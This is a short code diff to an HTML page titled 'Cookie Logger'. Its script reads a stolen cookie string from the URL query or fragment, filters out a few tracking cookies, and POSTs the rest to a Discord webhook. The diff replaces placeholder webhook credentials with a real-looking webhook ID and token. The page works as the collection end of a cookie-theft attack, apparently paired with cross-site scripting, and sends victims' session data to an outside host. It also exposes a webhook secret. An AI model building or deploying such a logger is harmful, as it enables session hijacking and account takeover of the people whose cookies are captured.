@@ -5,10 +5,11 @@
   <title>Cookie Logger</title>
 </head>
 <body>
+    <p>v1</p>
   <script>
     const urlParams = new URLSearchParams(window.location.search);
     const hashParams = new URLSearchParams(window.location.hash.substring(1));
-    const rawCookie = urlParams.get('cookie') || hashParams.get('cookie') || '[No cookie]';
+    const rawCookie = urlParams.get('cookie') || hashParams.get('cookie') || '[No cookie found]';
 
     const cookiesToIgnore = [
       '_tracking_consent',
@@ -27,7 +28,7 @@
       })
       .join('; ');
 
-    fetch('https://discord.com/api/webhooks/TON_ID/TON_TOKEN', {
+    fetch('https://discord.com/api/webhooks/1399087360490082378/x11chNJFs2z93FEqBEMoSqX0Pmh1ZoX9bbv1eTLq6R8AMyKbhSdKHKVIlkBIaDf7RDnT', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({content: `Cookies : ${filtered}`})
